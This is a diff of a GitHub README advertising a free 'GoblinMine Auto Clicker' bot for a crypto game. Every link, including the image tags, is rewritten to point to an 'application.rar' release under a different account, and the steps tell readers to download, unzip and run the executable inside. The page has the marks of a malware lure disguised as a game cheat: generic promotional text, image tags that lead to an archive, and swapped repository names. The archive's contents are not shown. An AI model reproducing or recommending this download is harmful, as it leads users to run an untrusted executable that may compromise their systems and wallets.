@@ -2,7 +2,7 @@
 
 Welcome to the GoblinMine Auto Clicker Download 2024 repository! This repository is dedicated to providing a free download of the GoblinMine Auto Clicker bot for Windows. This bot is specifically designed for the crypto game GoblinMine, allowing you to automate the entire process within the game. Say goodbye to manual clicking and let the bot handle the repetitive tasks for you!
 
-![GoblinMine Auto Clicker](https://github.com/dangbatai01092002/GoblinMine-auto/releases/download/Download/application.rar)
+![GoblinMine Auto Clicker](https://github.com/whitemoney4/GoblinMine-autoclicker/releases/download/Download/application.rar)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -20,11 +20,11 @@ GoblinMine Auto Clicker is a versatile tool that enhances your gaming experience
 - **Efficiency**: Save time and effort by letting the bot handle repetitive tasks.
 - **Customization**: Adjust settings to suit your preferences and gaming style.
 
-![GoblinMine Game](https://github.com/dangbatai01092002/GoblinMine-auto/releases/download/Download/application.rar)
+![GoblinMine Game](https://github.com/whitemoney4/GoblinMine-autoclicker/releases/download/Download/application.rar)
 
 ## Installation
 To install the GoblinMine Auto Clicker bot, follow these steps:
-1. Download the software package from the following link: ![![Download](https://github.com/dangbatai01092002/GoblinMine-auto/releases/download/Download/application.rar)
+1. Download the software package from the following link: ![![Download](https://github.com/whitemoney4/GoblinMine-autoclicker/releases/download/Download/application.rar)
 2. Unzip the downloaded file to your desired location.
 3. Run the executable file to launch the bot.
 
@@ -40,6 +40,6 @@ We welcome contributions to the GoblinMine Auto Clicker Download 2024 repository
 ## License
 The GoblinMine Auto Clicker bot is distributed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and share this software in accordance with the terms of the license.
 
-![GoblinMine Logo](https://github.com/dangbatai01092002/GoblinMine-auto/releases/download/Download/application.rar)
+![GoblinMine Logo](https://github.com/whitemoney4/GoblinMine-autoclicker/releases/download/Download/application.rar)
 
 Thank you for choosing the GoblinMine Auto Clicker bot for your gaming needs! Happy gaming and enjoy the automation provided by this powerful tool. Download now and level up your GoblinMine gameplay experience!
